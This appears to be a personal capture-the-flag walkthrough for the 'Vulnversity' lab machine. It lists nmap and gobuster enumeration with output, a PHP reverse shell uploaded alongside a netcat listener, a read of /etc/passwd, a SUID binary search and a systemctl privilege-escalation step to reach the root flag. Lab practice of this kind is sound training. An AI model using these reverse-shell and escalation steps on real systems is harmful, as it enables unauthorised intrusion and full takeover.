# Vulnversity
# Data: 11.09.2020

#IP: `10.10.102.181`


###Steps
1. nmap -sC -sV -oN nmap/initial <IP>
	- find HTTP port at 3333

#unzip wordlist gzip -u /usr/share/wordlist/rockyou.txt.gz

2. obuster dir -u http://10.10.102.181:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
	- results:
----
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.102.181:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/11 07:23:50 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
[ERROR] 2020/09/11 07:30:10 [!] Get http://10.10.102.181:3333/remixer: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/server-status (Status: 403)
[ERROR] 2020/09/11 07:43:13 [!] Get http://10.10.102.181:3333/alienskin: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/09/11 07:44:51 [!] Get http://10.10.102.181:3333/t13169: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
===============================================================
2020/09/11 07:45:07 Finished
===============================================================

----

#get php_reverse_shell.php from github and change name for easier use
3. change ip and port in revshell.php
	<IP>
	<port>: `9001`
4. start listnen on port using nc -lnvp <port>
5. check users by:
	cat /etc/passwd

#escalate
6. find / -perm -4000 2>/dev/null          
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs

7. use systemctl exploid to gain privilages
8. get flag from /root/flag.txt

###